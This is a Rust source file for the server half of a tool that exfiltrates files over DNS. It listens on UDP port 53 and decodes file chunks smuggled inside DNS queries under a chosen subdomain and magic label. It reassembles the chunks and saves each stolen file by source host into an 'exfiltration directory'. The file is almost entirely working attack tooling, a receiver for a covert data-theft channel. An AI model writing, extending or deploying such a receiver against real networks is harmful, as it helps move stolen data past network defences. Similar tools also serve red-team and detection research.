use std::fs::File;
use std::io::Write;
use std::net::{Ipv4Addr, SocketAddrV4, UdpSocket};
use std::path::Path;

use log::{debug, info, trace, warn};
use structopt::StructOpt;
use trust_dns_proto::op::Header;
use trust_dns_proto::rr::{IntoName, Name, RData, Record};
use trust_dns_proto::rr::domain::Label;
use trust_dns_proto::rr::record_type::RecordType::A;
use trust_dns_proto::serialize::binary::{BinDecodable, BinDecoder, BinEncodable, BinEncoder};

use dns_encoding::decode::MessageDecoder;
use dns_encoding::message::MessageResponse;
use dns_encoding::server::{ServerError, ServerState};

#[derive(Debug, StructOpt)]
#[structopt(name = "dns-exfiltrating-client", about = "An client to exfiltrate files via dns.")]
struct ServerOptions {
    #[structopt(short, long)]
    exfiltration_directory: String,

    #[structopt(short, long)]
    sub_domain: String,

    #[structopt(short, long, default_value = "8k1")]
    magic_nr: String,

    #[structopt(short, long, default_value = "53")]
    port: u16,
}

fn main() -> std::io::Result<()> {
    env_logger::init();

    let opt: ServerOptions = ServerOptions::from_args();
    info!("opt = {:?}", opt);
    let exfiltration_path = Path::new(&opt.exfiltration_directory);
    assert!(exfiltration_path.exists(), "Exfiltration directory must exist");
    let address = SocketAddrV4::new(Ipv4Addr::UNSPECIFIED, opt.port);
    let socket = UdpSocket::bind(address)?;
    let mut buffer = vec![0 as u8; 1024];
    let mut send_buffer = Vec::with_capacity(1024);

    let magic_nr = Label::from_ascii(opt.magic_nr.as_str()).unwrap();
    let sub_domain = Name::from_ascii(opt.sub_domain.as_str()).unwrap();
    let message_decoder = MessageDecoder::new(magic_nr, sub_domain);

    let mut server_state = ServerState::new();

    loop {
        let (bytes_read, source) = socket.recv_from(&mut buffer)?;
        debug!("Received from {}: Message with {} bytes", source, bytes_read);

        let mut bin_decoder = BinDecoder::new(&buffer);
        let mut dns_message = trust_dns_proto::op::Message::read(&mut bin_decoder).unwrap();
        debug!("Received dns message = {:?}", dns_message);
        let message = message_decoder.decode(&dns_message).unwrap();
        debug!("Decoded message = {:?}", message);

        match server_state.handle_message(message) {
            Ok(response) => {
                debug!("Responding with: {:?}", response);
                let r_data = response.encode();
                let name = dns_message.queries().get(0).unwrap().name().clone();
                dns_message.add_answer(Record::from_rdata(name, 120, r_data));
                let mut bin_encoder = BinEncoder::new(&mut send_buffer);
                dns_message.emit(&mut bin_encoder).unwrap();
                socket.send_to(&send_buffer, source)?;
                send_buffer.clear();
            }
            Err(e) => {
                warn!("Server error: {:?}", e)
            }
        }


        for state in &server_state.finished_states {
            println!("Finished transmission of file {} from host {}", state.name, state.host);
            let target_path = exfiltration_path.join(&state.name);
            let mut file = File::create(target_path)?;
            file.write_all(&state.data)?;
        }
    }
}
